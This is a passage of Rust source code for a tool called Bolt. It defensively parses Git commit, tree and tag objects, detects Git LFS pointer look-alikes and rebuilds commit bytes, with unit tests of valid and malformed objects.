//! Git's commits, trees and tags, read as Git reads them, and a commit's bytes rebuilt from the
//! save it became (decisions 032, 035 and 037). Objects may be hostile: what `git fsck` would
//! refuse is `Broken`, and what Git reads but Bolt can't take as it is, `Unimportable`.
#![deny(clippy::indexing_slicing, clippy::arithmetic_side_effects)]

use std::cmp::Ordering;
use std::fmt::Write as _;

use super::id::hex_id;
use super::lfs::{LFS_SPEC, LFS_SPECS, LfsPointer, MAX_LFS_POINTER_BYTES, lfs_pointer};
use super::{GitError, GitId, HashKind, ObjectType, broken, shown, unimportable};
use crate::listing::{EntryKind, MAX_ENTRIES};
use crate::save::{EXTRA_GIT_HEADER, EXTRA_GIT_ORIGINAL_MESSAGE, MAX_PARENTS, Person, Save};

/// A commit, borrowing its bytes. `author` and `committer` are those lines after their key, as
/// written; `header` is every byte before the empty line, and `message` every byte after it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Commit<'a> {
    pub tree: GitId,
    pub parents: Vec<GitId>,
    pub author: &'a [u8],
    pub committer: &'a [u8],
    /// The first `encoding` line's value: what the message is written in.
    pub encoding: Option<&'a [u8]>,
    /// The first `change-id` line's value, which Jujutsu writes.
    pub change_id: Option<&'a [u8]>,
    pub header: &'a [u8],
    pub message: &'a [u8],
}

/// Reads a commit in the order `git fsck` checks: `tree`, up to 1,024 `parent` lines, `author`
/// and `committer`, then other headers, an empty line and the message. What Git reads but Bolt
/// doesn't take is checked after the damage `git fsck` finds, so damage is what gets named.
pub fn parse_commit(data: &[u8], hash: HashKind) -> Result<Commit<'_>, GitError> {
    let (header, message) = split_header(data, "commit")?;
    let mut lines = header_lines(header);
    let tree = lines
        .next()
        .and_then(|line| line.strip_prefix(b"tree "))
        .ok_or_else(|| broken("a commit doesn't start with a `tree` line"))?;
    let tree =
        hex_id(hash, tree).ok_or_else(|| broken("a commit's `tree` line doesn't hold a Git ID"))?;
    let mut parents = Vec::new();
    let mut count: u64 = 0;
    let mut line = lines.next();
    while let Some(hex) = line.and_then(|line| line.strip_prefix(b"parent ")) {
        let parent = hex_id(hash, hex)
            .ok_or_else(|| broken("a commit's `parent` line doesn't hold a Git ID"))?;
        // Counted to the end, so the message can say how many there are.
        count = count.saturating_add(1);
        if count <= MAX_PARENTS {
            parents.push(parent);
        }
        line = lines.next();
    }
    let author = line
        .and_then(|line| line.strip_prefix(b"author "))
        .ok_or_else(|| {
            broken("a commit has no `author` line after its `tree` and `parent` lines")
        })?;
    let committer = lines
        .next()
        .and_then(|line| line.strip_prefix(b"committer "))
        .ok_or_else(|| broken("a commit has no `committer` line after its `author` line"))?;
    let (mut encoding, mut change_id) = (None, None);
    other_headers(lines, "commit", |key, value| {
        match key {
            // Each comes once, in its place: Git's own tools disagree on which of two authors
            // counts, so Bolt doesn't guess.
            b"tree" | b"parent" | b"author" | b"committer" => {
                return Err(unimportable(format!(
                    "a commit's header has the key `{}` out of place",
                    String::from_utf8_lossy(key)
                )));
            }
            b"encoding" => {
                encoding.get_or_insert(value);
            }
            b"change-id" => {
                change_id.get_or_insert(value);
            }
            _ => {}
        }
        Ok(())
    })?;
    if count > MAX_PARENTS {
        return Err(unimportable(format!(
            "a commit has {count} parents, more than the {MAX_PARENTS} Bolt keeps"
        )));
    }
    let message = message.ok_or_else(|| no_empty_line("commit"))?;
    Ok(Commit {
        tree,
        parents,
        author,
        committer,
        encoding,
        change_id,
        header,
        message,
    })
}

/// An entry of a tree, borrowing its name. `standard_mode` is whether Git writes its mode that
/// way today, so the tree gets its ID back when written again.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TreeEntry<'a> {
    pub kind: EntryKind,
    pub standard_mode: bool,
    pub name: &'a [u8],
    pub id: GitId,
}

/// Reads a tree's entries, each `mode name\0id`, refusing modes Bolt doesn't take, entries out
/// of Git's order or of one name, and more entries than a Bolt folder may hold. Names are the
/// importer's to judge (decision 035).
pub fn parse_tree(data: &[u8], hash: HashKind) -> Result<Vec<TreeEntry<'_>>, GitError> {
    parse_tree_with_limit(data, hash, MAX_ENTRIES)
}

/// `parse_tree`, stopping past `max_entries`: a tree becomes one folder, which can't hold more,
/// and stopping there bounds the memory a hostile one takes.
fn parse_tree_with_limit(
    data: &[u8],
    hash: HashKind,
    max_entries: u64,
) -> Result<Vec<TreeEntry<'_>>, GitError> {
    let mut entries: Vec<TreeEntry<'_>> = Vec::new();
    // A mode Bolt doesn't take is held back while the rest is checked: damage is named first.
    let mut odd_mode = None;
    let mut rest = data;
    while !rest.is_empty() {
        let cut = || broken("a tree ends in the middle of an entry");
        let (mode, after) = split_at_byte(rest, b' ').ok_or_else(cut)?;
        let (name, after) = split_at_byte(after, 0).ok_or_else(cut)?;
        let (id, after) = after.split_at_checked(hash.len()).ok_or_else(cut)?;
        rest = after;
        let git_mode = octal(mode).ok_or_else(|| {
            broken(format!(
                "a tree entry `{}` has a damaged mode `{}`",
                shown(name),
                shown(mode)
            ))
        })?;
        let (kind, standard_mode) = mode_kind(git_mode, mode).unwrap_or_else(|| {
            odd_mode.get_or_insert_with(|| {
                unimportable(format!(
                    "a tree entry `{}` has the mode `{}`, which Git doesn't write and Bolt \
                     doesn't take",
                    shown(name),
                    shown(mode)
                ))
            });
            // Never returned; it only needs to sort as Git sorts it.
            let git_folder = git_mode.0 & 0o170000 == 0o040000;
            let kind = if git_folder {
                EntryKind::Folder
            } else {
                EntryKind::File
            };
            (kind, false)
        });
        let folder = kind == EntryKind::Folder;
        if let Some(last) = entries.last() {
            // A file and a folder of one name needn't be neighbours: `a`, `a.b`, then `a/`.
            let file_too = folder
                && entries
                    .binary_search_by(|e| {
                        git_order(e.name, e.kind == EntryKind::Folder, name, false)
                    })
                    .is_ok();
            if last.name == name || file_too {
                return Err(broken(format!(
                    "a tree has two entries named `{}`",
                    shown(name)
                )));
            }
            if git_order(last.name, last.kind == EntryKind::Folder, name, folder) != Ordering::Less
            {
                return Err(broken(format!(
                    "a tree's entries `{}` and `{}` are out of Git's order",
                    shown(last.name),
                    shown(name)
                )));
            }
        }
        if entries.len() as u64 >= max_entries {
            return Err(unimportable(format!(
                "a tree holds more than {max_entries} entries, more than a Bolt folder may hold"
            )));
        }
        entries.push(TreeEntry {
            kind,
            standard_mode,
            name,
            id: GitId::new(hash, id),
        });
    }
    match odd_mode {
        Some(e) => Err(e),
        None => Ok(entries),
    }
}

/// A mode's kind, and whether it is one of the five Git writes; `None` if Bolt doesn't take it.
fn mode_kind((value, was_cut): (u16, bool), mode: &[u8]) -> Option<(EntryKind, bool)> {
    if was_cut {
        return None;
    }
    let kind = match value {
        0o040000 => EntryKind::Folder,
        0o120000 => EntryKind::Symlink,
        0o160000 => EntryKind::ProjectLink,
        // Any regular file's mode, by its owner-execute bit, as Git's `canon_mode` reads it.
        0o100000..=0o107777 if value & 0o100 == 0 => EntryKind::File,
        0o100000..=0o107777 => EntryKind::Executable,
        // Git reads most of the rest as a submodule, taking a file's ID for a commit.
        _ => return None,
    };
    let standard = matches!(
        mode,
        b"100644" | b"100755" | b"120000" | b"40000" | b"160000"
    );
    Some((kind, standard))
}

/// A mode's octal digits as Git reads them, however many there are: their value cut to Git's
/// 16 bits, and whether it had to be cut. `None` if there are none, or anything else is there,
/// which Git can't read either.
fn octal(digits: &[u8]) -> Option<(u16, bool)> {
    if digits.is_empty() {
        return None;
    }
    digits
        .iter()
        .try_fold((0u16, false), |(value, was_cut), &digit| {
            let digit = digit.checked_sub(b'0').filter(|&d| d < 8)?;
            let (value, past_mul) = value.overflowing_mul(8);
            let (value, past_add) = value.overflowing_add(u16::from(digit));
            Some((value, was_cut || past_mul || past_add))
        })
}

/// Git's order for a tree's entries: by name bytes, a folder's name as if it ended in `/`.
fn git_order(a: &[u8], a_folder: bool, b: &[u8], b_folder: bool) -> Ordering {
    fn key(name: &[u8], folder: bool) -> impl Iterator<Item = &u8> {
        name.iter().chain(folder.then_some(&b'/'))
    }
    key(a, a_folder).cmp(key(b, b_folder))
}

/// A tag object, borrowing its bytes. `message` is every byte after the empty line, an
/// old-style signature included.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TagObject<'a> {
    pub object: GitId,
    pub kind: ObjectType,
    pub name: &'a [u8],
    pub message: &'a [u8],
}

/// Reads a tag object as Git does: `object`, `type` and `tag` lines, then other headers
/// (`tagger` among them), an empty line and the message.
pub fn parse_tag(data: &[u8], hash: HashKind) -> Result<TagObject<'_>, GitError> {
    let (header, message) = split_header(data, "tag")?;
    let mut lines = header_lines(header);
    let object = lines
        .next()
        .and_then(|line| line.strip_prefix(b"object "))
        .ok_or_else(|| broken("a tag doesn't start with an `object` line"))?;
    let object = hex_id(hash, object)
        .ok_or_else(|| broken("a tag's `object` line doesn't hold a Git ID"))?;
    let kind = lines
        .next()
        .and_then(|line| line.strip_prefix(b"type "))
        .ok_or_else(|| broken("a tag has no `type` line after its `object` line"))?;
    let kind = ObjectType::named(kind).ok_or_else(|| {
        broken(format!(
            "a tag's `type` line names `{}`, which isn't a kind of Git object",
            shown(kind)
        ))
    })?;
    let name = lines
        .next()
        .and_then(|line| line.strip_prefix(b"tag "))
        .ok_or_else(|| broken("a tag has no `tag` line after its `type` line"))?;
    other_headers(lines, "tag", |_, _| Ok(()))?;
    let message = message.ok_or_else(|| no_empty_line("tag"))?;
    Ok(TagObject {
        object,
        kind,
        name,
        message,
    })
}

/// A commit's or tag's header, every byte before its first empty line, and its message, every
/// byte after it; no message when the header's last line ends the data, as Git allows. A NUL
/// in the header, or a header cut off inside a line, is `Broken`.
fn split_header<'a>(data: &'a [u8], what: &str) -> Result<(&'a [u8], Option<&'a [u8]>), GitError> {
    let mut header_len = 0usize;
    for line in data.split_inclusive(|&b| b == b'\n') {
        if line == b"\n" {
            let (header, rest) = data.split_at_checked(header_len).unwrap_or_default();
            return Ok((header, Some(rest.get(1..).unwrap_or_default())));
        }
        if line.contains(&0) {
            return Err(broken(format!("a {what}'s header holds a NUL byte")));
        }
        header_len = header_len.saturating_add(line.len());
    }
    if data.ends_with(b"\n") {
        Ok((data, None))
    } else {
        Err(broken(format!("a {what} ends inside its header")))
    }
}

/// A commit or tag that Git reads as having no message: Bolt keeps an empty line between the
/// header and the message, and this one has none.
fn no_empty_line(what: &str) -> GitError {
    unimportable(format!(
        "a {what} has no empty line between its header and its message"
    ))
}

/// A header's lines, without their LFs.
fn header_lines(header: &[u8]) -> impl Iterator<Item = &[u8]> {
    header
        .strip_suffix(b"\n")
        .into_iter()
        .flat_map(|lines| lines.split(|&b| b == b'\n'))
}

/// The headers after a commit's or tag's own lines: each `key value`, maybe continued on lines
/// that start with a space. Each key goes to `each` with its first line's value as it is read,
/// and nothing is kept: a hostile header can hold millions of lines. Git doesn't check these, so
/// a line that breaks the form is `Unimportable`, not `Broken`.
fn other_headers<'a>(
    lines: impl Iterator<Item = &'a [u8]>,
    what: &str,
    mut each: impl FnMut(&'a [u8], &'a [u8]) -> Result<(), GitError>,
) -> Result<(), GitError> {
    let mut seen_header = false;
    for line in lines {
        if line.first() == Some(&b' ') {
            if !seen_header {
                return Err(unimportable(format!(
                    "a {what}'s header has a line that starts with a space but follows no header \
                     it could continue"
                )));
            }
        } else {
            let (key, value) = split_at_byte(line, b' ').ok_or_else(|| {
                unimportable(format!(
                    "a {what}'s header has a line that isn't a key and a value"
                ))
            })?;
            each(key, value)?;
            seen_header = true;
        }
    }
    Ok(())
}

/// `bytes` up to the first `byte`, and what follows it.
pub(crate) fn split_at_byte(bytes: &[u8], byte: u8) -> Option<(&[u8], &[u8])> {
    let at = bytes.iter().position(|&b| b == byte)?;
    let (before, after) = bytes.split_at_checked(at)?;
    Some((before, after.get(1..)?))
}

/// Whether a blob that isn't brought in as a Git LFS file, of any size, should be named as a
/// look-alike. Git LFS's smudge filter parses only the first 1,024 bytes it is handed, whatever
/// follows, and Git may hand them over with each LF that isn't after a CR turned into CR LF,
/// which pushes bytes out of those 1,024. So the blob counts when `lfs_pointer` takes its first
/// 1,024 bytes as they are or in that CRLF form, or when they look like a pointer. `start` holds
/// the blob's first 1,024 bytes, or all of it if it is shorter; nothing past them is read.
#[must_use]
pub fn is_lfs_lookalike(start: &[u8]) -> bool {
    let head = start.get(..MAX_LFS_POINTER_BYTES).unwrap_or(start);
    let mut crlf = Vec::with_capacity(head.len().saturating_mul(2));
    let mut last = 0;
    for &b in head {
        if b == b'\n' && last != b'\r' {
            crlf.push(b'\r');
        }
        crlf.push(b);
        last = b;
    }
    crlf.truncate(MAX_LFS_POINTER_BYTES);
    lfs_pointer(head).is_some() || lfs_pointer(&crlf).is_some() || looks_like_lfs_pointer(head)
}

/// Whether `data` is the pointer `p` in the exact form Git LFS writes (`Encoded` in its
/// lfs/pointer.go): its own version, the oid and the size, each line ending in LF. Git LFS keeps
/// an empty file as an empty blob, so no pointer of size 0 is in that form.
#[must_use]
pub fn is_exact_lfs_pointer(data: &[u8], p: &LfsPointer) -> bool {
    let exact = format!(
        "version {LFS_SPEC}\noid sha256:{}\nsize {}\n",
        p.oid_hex(),
        p.size
    );
    !p.extensions && p.size > 0 && data == exact.as_bytes()
}

/// Whether a blob looks like a Git LFS pointer, whether or not Git LFS would read it as one
/// (decision 037): not empty and at most 1,024 bytes, a first line that starts with `version` and
/// one of Git LFS's specs, a line that is `oid sha256:` and 64 hex digits, and a line that starts
/// with `size `, in any order, among any other lines.
#[must_use]
pub fn looks_like_lfs_pointer(data: &[u8]) -> bool {
    if data.is_empty() || data.len() > MAX_LFS_POINTER_BYTES {
        return false;
    }
    let text = String::from_utf8_lossy(data);
    let version = text
        .lines()
        .next()
        .and_then(|line| line.strip_prefix("version "));
    let oid = |line: &str| {
        line.strip_prefix("oid sha256:")
            .is_some_and(|hex| hex.len() == 64 && hex.bytes().all(|b| b.is_ascii_hexdigit()))
    };
    version.is_some_and(|version| LFS_SPECS.iter().any(|spec| version.starts_with(spec)))
        && text.lines().any(oid)
        && text.lines().any(|line| line.starts_with("size "))
}

/// A Git commit's bytes, rebuilt from the save it became (storage-format.md section 4):
/// `git-header` if the save kept one, else the standard form from `tree`, `parents` and the
/// save's people; then an empty line and the message, from `git-original-message` if kept.
#[must_use]
pub fn rebuild_commit(save: &Save, tree: &GitId, parents: &[GitId]) -> Vec<u8> {
    let mut out = match save.extra.get(EXTRA_GIT_HEADER) {
        Some(header) => header.clone(),
        None => {
            let mut header = format!("tree {}\n", tree.to_hex());
            for parent in parents {
                let _ = writeln!(header, "parent {}", parent.to_hex());
            }
            ident(&mut header, "author", &save.author);
            ident(&mut header, "committer", &save.saver);
            header.into_bytes()
        }
    };
    out.push(b'\n');
    let message = save.extra.get(EXTRA_GIT_ORIGINAL_MESSAGE);
    out.extend_from_slice(message.map_or(save.message.as_bytes(), Vec::as_slice));
    out
}

/// The line Git writes for `person` under `key`: `key name <email> seconds ±HHMM`.
fn ident(out: &mut String, key: &str, person: &Person) {
    let sign = if person.tz_offset_min < 0 { '-' } else { '+' };
    let zone = person.tz_offset_min.unsigned_abs();
    let _ = writeln!(
        out,
        "{key} {} <{}> {} {sign}{:02}{:02}",
        person.name,
        person.email,
        person.time_ms.div_euclid(1000),
        zone / 60,
        zone % 60
    );
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
    #![allow(clippy::indexing_slicing, clippy::arithmetic_side_effects)]
    use super::*;
    use crate::git::{GitError, GitId, HashKind, ObjectType, object_id, parse_person};
    use crate::id::{ChangeId, Id};
    use crate::listing::EntryKind::{self, Executable, File, Folder, ProjectLink, Symlink};
    use crate::save::{
        EXTRA_GIT_COMMIT, EXTRA_GIT_HEADER, EXTRA_GIT_ORIGINAL_MESSAGE, Person, Save,
    };
    use crate::test_support::{HOSTILE, assert_hostile_text_escaped};
    use HashKind::{Sha1, Sha256};
    use std::collections::BTreeMap;

    /// The empty tree, in each hash.
    const TREE: &str = "4b825dc642cb6eb9a060e54bf8d69288fbee4904";
    const TREE_256: &str = "6ef19b41225c5369f1c104d45d8d85efa9b057b53b14b4b9b939dd74decc5321";
    const AUTHOR: &str = "Ida Lark <ida.lark@example.com> 1601234567 -0400";
    const COMMITTER: &str = "Omar Fenn <omar.fenn@example.com> 1601234627 +0545";
    const GPGSIG: &str = "gpgsig -----BEGIN PGP SIGNATURE-----\n \n iHUEABYKAB0WIQRNmrJ5\n \
                          =Xd3h\n -----END PGP SIGNATURE-----\n";
    const MERGETAG: &str = "mergetag object 1111111111111111111111111111111111111111\n \
                            type commit\n tag v1.0\n \
                            tagger Vera Toll <vera.toll@example.com> 1601234500 +0000\n \n \
                            Version 1.0\n -----BEGIN PGP SIGNATURE-----\n \n \
                            iHUEABYKAB0WIQRNmrJ5\n -----END PGP SIGNATURE-----\n";

    fn id(hash: HashKind, hex: &str) -> GitId {
        GitId::from_hex(hash, hex).unwrap()
    }

    /// A SHA-1 ID in hex, made of `n`.
    fn nth(n: usize) -> String {
        format!("{n:040x}")
    }

    /// A commit as Git writes one: `tree`, a `parent` line each, the author and committer above,
    /// `extra` header lines, an empty line and `message`.
    fn commit(tree: &str, parents: &[String], extra: &str, message: &[u8]) -> Vec<u8> {
        let mut raw = format!("tree {tree}\n");
        for parent in parents {
            raw += &format!("parent {parent}\n");
        }
        raw += &format!("author {AUTHOR}\ncommitter {COMMITTER}\n{extra}\n");
        [raw.as_bytes(), message].concat()
    }

    /// A commit with this author line and the usual everything else.
    fn authored(author: &[u8]) -> Vec<u8> {
        [
            format!("tree {TREE}\nauthor ").as_bytes(),
            author,
            format!("\ncommitter {COMMITTER}\n\nm\n").as_bytes(),
        ]
        .concat()
    }

    /// Damage `git fsck` finds too: `Broken`, whose hint sends the user to it.
    fn assert_broken<T: std::fmt::Debug>(what: &str, result: Result<T, GitError>, says: &str) {
        match result {
            Err(e @ GitError::Broken { .. }) => {
                assert!(e.to_string().contains(says), "{what}: {e}");
                assert!(e.hint().unwrap().contains("git fsck"), "{what}");
            }
            other => panic!("{what}: {other:?}"),
        }
    }

    /// What Git reads but Bolt can't take as it is: `Unimportable`, whose hint doesn't send the
    /// user to `git fsck`, which would find nothing wrong.
    fn assert_unimportable<T: std::fmt::Debug>(
        what: &str,
        result: Result<T, GitError>,
        says: &str,
    ) {
        match result {
            Err(e @ GitError::Unimportable { .. }) => {
                let (message, hint) = (e.to_string(), e.hint().unwrap());
                assert!(
                    message.starts_with("Git reads this object"),
                    "{what}: {message}"
                );
                assert!(message.contains(says), "{what}: {message}");
                assert!(hint.contains("Rewrite the Git history"), "{what}: {hint}");
                assert!(!hint.contains("fsck"), "{what}: {hint}");
            }
            other => panic!("{what}: {other:?}"),
        }
    }

    #[test]
    fn good_commits_parse() {
        let one = [nth(1)];
        let two = [nth(1), nth(2)];
        let many: Vec<String> = (1..=1024).map(nth).collect();
        let utf8 = Some(&b"UTF-8"[..]);
        let latin1 = Some(&b"ISO-8859-1"[..]);
        let jj = Some(&b"zyxwvutsrqponmlkzyxwvutsrqponmlk"[..]);
        // What, the commit, its parents, encoding and change ID, and its message.
        type Case<'a> = (
            &'a str,
            Vec<u8>,
            &'a [String],
            Option<&'a [u8]>,
            Option<&'a [u8]>,
            &'a [u8],
        );
        let cases: [Case; 9] = [
            (
                "a root commit",
                commit(TREE, &[], "", b"first\n"),
                &[],
                None,
                None,
                b"first\n",
            ),
            (
                "a signed commit",
                commit(TREE, &one, GPGSIG, b"signed\n"),
                &one,
                None,
                None,
                b"signed\n",
            ),
            (
                "a merge of a signed tag",
                commit(TREE, &two, MERGETAG, b"Merge tag 'v1.0'\n"),
                &two,
                None,
                None,
                b"Merge tag 'v1.0'\n",
            ),
            (
                "the first encoding counts",
                commit(
                    TREE,
                    &[],
                    "encoding ISO-8859-1\nencoding UTF-8\n",
                    b"caf\xe9\n",
                ),
                &[],
                latin1,
                None,
                b"caf\xe9\n",
            ),
            (
                "the first change-id counts",
                commit(
                    TREE,
                    &one,
                    "change-id zyxwvutsrqponmlkzyxwvutsrqponmlk\nchange-id kkkk\nencoding UTF-8\n",
                    b"jj\n",
                ),
                &one,
                utf8,
                jj,
                b"jj\n",
            ),
            (
                "1,024 parents",
                commit(TREE, &many, "", b"octopus\n"),
                &many,
                None,
                None,
                b"octopus\n",
            ),
            (
                "an empty message",
                commit(TREE, &[], "", b""),
                &[],
                None,
                None,
                b"",
            ),
            (
                "an empty line and a NUL in the message",
                commit(TREE, &[], "", b"\n\na\0b"),
                &[],
                None,
                None,
                b"\n\na\0b",
            ),
            (
                "an unknown header",
                commit(TREE, &[], "x-tool some value\n  more\n", b"m"),
                &[],
                None,
                None,
                b"m",
            ),
        ];
        for (what, raw, parents, encoding, change_id, message) in cases {
            let c = parse_commit(&raw, Sha1).unwrap_or_else(|e| panic!("{what}: {e}"));
            assert_eq!(c.tree, id(Sha1, TREE), "{what}");
            let parents: Vec<GitId> = parents.iter().map(|p| id(Sha1, p)).collect();
            assert_eq!(c.parents, parents, "{what}");
            assert_eq!(c.author, AUTHOR.as_bytes(), "{what}");
            assert_eq!(c.committer, COMMITTER.as_bytes(), "{what}");
            assert_eq!(c.encoding, encoding, "{what}");
            assert_eq!(c.change_id, change_id, "{what}");
            assert_eq!(c.message, message, "{what}");
            assert_eq!([c.header, b"\n", c.message].concat(), raw, "{what}");
            assert!(c.header.ends_with(b"\n"), "{what}");
        }
        // Lines Git writes unusually are kept as they are.
        let raw = format!("tree {TREE}\nauthor A <a@b> 0 -0000\ncommitter  <> 1 +0000\n\nm");
        let c = parse_commit(raw.as_bytes(), Sha1).unwrap();
        assert_eq!(
            (c.author, c.committer),
            (&b"A <a@b> 0 -0000"[..], &b" <> 1 +0000"[..])
        );
        // A SHA-256 commit, its IDs in either letter case, as Git reads them.
        let parent = "6230c9b97162440b78b8dc5601e48ec3974574fbafe81baff53aa1d7f4baeb35";
        let raw = commit(&TREE_256.to_uppercase(), &[parent.to_owned()], "", b"m");
        let c = parse_commit(&raw, Sha256).unwrap();
        assert_eq!(
            (c.tree, c.parents),
            (id(Sha256, TREE_256), vec![id(Sha256, parent)])
        );
    }

    #[test]
    fn bad_commits_are_refused() {
        let tree = format!("tree {TREE}\n");
        let parent = format!("parent {}\n", nth(1));
        let people = format!("author {AUTHOR}\ncommitter {COMMITTER}\n");
        let too_many = String::from_utf8(commit(
            TREE,
            &(1..=1025).map(nth).collect::<Vec<_>>(),
            "",
            b"m",
        ))
        .unwrap();
        // Damage `git fsck` finds too.
        for (what, raw, says) in [
            (
                "two trees",
                format!("{tree}{tree}{people}\nm"),
                "no `author` line",
            ),
            (
                "author before parent",
                format!("{tree}author {AUTHOR}\n{parent}committer {COMMITTER}\n\nm"),
                "no `committer` line",
            ),
            (
                "missing committer",
                format!("{tree}author {AUTHOR}\n\nm"),
                "no `committer` line",
            ),
            (
                "missing author",
                format!("{tree}committer {COMMITTER}\n\nm"),
                "no `author` line",
            ),
            (
                "no tree",
                format!("{parent}{people}\nm"),
                "doesn't start with a `tree` line",
            ),
            ("nothing at all", String::new(), "ends inside its header"),
            (
                "only an empty line",
                "\n".to_owned(),
                "doesn't start with a `tree` line",
            ),
            (
                "a NUL in the header",
                format!("{tree}author A\0 <a@b> 1 +0000\ncommitter {COMMITTER}\n\nm"),
                "NUL",
            ),
            (
                "a header cut off inside a line",
                format!("{tree}{people}m"),
                "ends inside its header",
            ),
            (
                "a short tree ID",
                format!("tree {}\n{people}\nm", &TREE[..39]),
                "`tree` line",
            ),
            (
                "a tree ID and more",
                format!("tree {TREE} \n{people}\nm"),
                "`tree` line",
            ),
            (
                "a CRLF header",
                format!("tree {TREE}\r\n{people}\nm"),
                "`tree` line",
            ),
            (
                "a bad parent ID",
                format!("{tree}parent {}g\n{people}\nm", &nth(1)[..39]),
                "`parent` line",
            ),
            // Damage is named before what Git reads but Bolt doesn't take.
            (
                "1,025 parents and no author",
                too_many.replace(&format!("author {AUTHOR}\n"), ""),
                "no `author` line",
            ),
            (
                "no committer and no empty line",
                format!("{tree}author {AUTHOR}\n"),
                "no `committer` line",
            ),
        ] {
            assert_broken(what, parse_commit(raw.as_bytes(), Sha1), says);
        }
        let raw = commit(TREE, &[], "", b"m");
        assert_broken("a SHA-1 tree", parse_commit(&raw, Sha256), "`tree` line");

        // Commits Git reads, and `git fsck` passes, that Bolt can't take as they are.
        for (what, raw, says) in [
            (
                "1,025 parents",
                too_many.clone(),
                "1025 parents, more than the 1024",
            ),
            ("no empty line", format!("{tree}{people}"), "no empty line"),
            (
                "a continuation of nothing",
                format!("{tree}{people} stray\n\nm"),
                "continue",
            ),
            (
                "a tree after the committer",
                format!("{tree}{people}{tree}\nm"),
                "the key `tree` out of place",
            ),
            (
                "a second author",
                format!("{tree}{people}author {AUTHOR}\n\nm"),
                "the key `author` out of place",
            ),
            (
                "a late parent",
                format!("{tree}{people}{parent}\nm"),
                "the key `parent` out of place",
            ),
            (
                "a second committer",
                format!("{tree}{people}committer {COMMITTER}\n\nm"),
                "the key `committer` out of place",
            ),
            (
                "a header without a value",
                format!("{tree}{people}x-tool\n\nm"),
                "a key and a value",
            ),
        ] {
            assert_unimportable(what, parse_commit(raw.as_bytes(), Sha1), says);
        }
    }

    #[test]
    fn many_short_headers_are_read_without_a_list() {
        // A hostile commit can hold millions of 3-byte header lines: each is looked at as it is
        // read, then dropped.
        let count = 1 << 20;
        let raw = commit(TREE, &[], &"a \n".repeat(count), b"m");
        let c = parse_commit(&raw, Sha1).unwrap();
        assert_eq!(c.message, b"m");
        let mut seen = 0;
        // After `tree`, `author` and `committer`.
        other_headers(header_lines(c.header).skip(3), "commit", |key, value| {
            assert_eq!((key, value), (&b"a"[..], &b""[..]));
            seen += 1;
            Ok(())
        })
        .unwrap();
        assert_eq!(seen, count);
    }

    /// A tree of `entries` (mode, name), in the order given, each pointing at `11…11`.
    fn tree(hash: HashKind, entries: &[(&str, &[u8])]) -> Vec<u8> {
        let id = vec![0x11; hash.len()];
        let mut raw = Vec::new();
        for (mode, name) in entries {
            raw.extend_from_slice(&[mode.as_bytes(), b" ", name, b"\0", &id].concat());
        }
        raw
    }

    #[test]
    fn trees_parse_and_order_is_checked() {
        // The five modes Git writes, in its order: a folder sorts as if its name ended in `/`.
        let raw = tree(
            Sha1,
            &[
                ("100644", b"a.c"),
                ("40000", b"a"),
                ("100755", b"a0"),
                ("120000", b"b"),
                ("160000", b"c"),
            ],
        );
        let entries = parse_tree(&raw, Sha1).unwrap();
        let got: Vec<(EntryKind, bool, &[u8])> = entries
            .iter()
            .map(|e| (e.kind, e.standard_mode, e.name))
            .collect();
        let want: [(EntryKind, bool, &[u8]); 5] = [
            (File, true, b"a.c"),
            (Folder, true, b"a"),
            (Executable, true, b"a0"),
            (Symlink, true, b"b"),
            (ProjectLink, true, b"c"),
        ];
        assert_eq!(got, want);
        assert!(entries.iter().all(|e| e.id.as_bytes() == [0x11; 20]));
        assert!(parse_tree(b"", Sha1).unwrap().is_empty());
        let raw = tree(Sha256, &[("100644", b"x")]);
        assert_eq!(
            parse_tree(&raw, Sha256).unwrap()[0].id.as_bytes(),
            [0x11; 32]
        );

        // Modes Git reads but doesn't write: zero-padded ones, and any regular file's mode, which
        // its owner-execute bit makes a file or an executable.
        for (mode, kind) in [
            ("040000", Folder),
            ("0100644", File),
            ("0100755", Executable),
            ("0120000", Symlink),
            ("0160000", ProjectLink),
            ("00000000100644", File),
            ("100664", File),
            ("100600", File),
            ("100000", File),
            ("100775", Executable),
            ("100100", Executable),
            ("104755", Executable),
            ("0100664", File),
        ] {
            let raw = tree(Sha1, &[(mode, b"x")]);
            let entries = parse_tree(&raw, Sha1).unwrap();
            assert_eq!(
                (entries[0].kind, entries[0].standard_mode),
                (kind, false),
                "{mode}"
            );
        }
        // Git reads any other octal mode too, as a link, a folder or (most) a submodule, and a
        // mode past its 16 bits cut down to them: Bolt doesn't take those.
        for mode in [
            "0", "644", "40755", "120777", "160644", "140000", "1100644", "1040000",
        ] {
            let raw = tree(Sha1, &[(mode, b"x")]);
            assert_unimportable(mode, parse_tree(&raw, Sha1), "Bolt doesn't take");
        }
        // A mode that isn't octal digits, Git can't read either.
        for mode in ["", "10064a", "100648", "-100644"] {
            let raw = tree(Sha1, &[(mode, b"x")]);
            assert_broken(mode, parse_tree(&raw, Sha1), "a damaged mode");
        }
        // An entry of such a mode sorts as Git sorts it (`40755` and `1040000` as folders), and
        // damage after it is still named as damage.
        for mode in ["40755", "1040000"] {
            let raw = tree(Sha1, &[("100644", b"a.c"), (mode, b"a"), ("100644", b"a0")]);
            assert_unimportable(mode, parse_tree(&raw, Sha1), "Bolt doesn't take");
        }
        let raw = tree(Sha1, &[("120777", b"b"), ("100644", b"a")]);
        assert_broken("then out of order", parse_tree(&raw, Sha1), "out of");
        let raw = [&tree(Sha1, &[("0", b"a")])[..], b"1"].concat();
        assert_broken("then cut", parse_tree(&raw, Sha1), "ends in the middle");
        let raw = tree(Sha1, &[("644", b"a"), ("100644", b"a.b"), ("40000", b"a")]);
        assert_broken(
            "then two of one name",
            parse_tree(&raw, Sha1),
            "two entries",
        );

        for (what, entries, says) in [
            (
                "out of order",
                &[("100644", "b"), ("100644", "a")][..],
                "`b` and `a` are out of",
            ),
            (
                "a folder before a file it sorts after",
                &[("40000", "a"), ("100644", "a.c")],
                "out of",
            ),
            (
                "bytes compared unsigned",
                &[("100644", "\u{e9}"), ("100644", "z")],
                "out of",
            ),
            (
                "two files of one name",
                &[("100644", "a"), ("100755", "a")],
                "two entries named `a`",
            ),
            (
                "two folders of one name",
                &[("40000", "a"), ("40000", "a")],
                "two entries named `a`",
            ),
            (
                "a file, then a folder of its name",
                &[("100644", "a"), ("40000", "a")],
                "two entries",
            ),
            (
                "a folder, then a file of its name",
                &[("40000", "a"), ("100644", "a")],
                "two entries",
            ),
            (
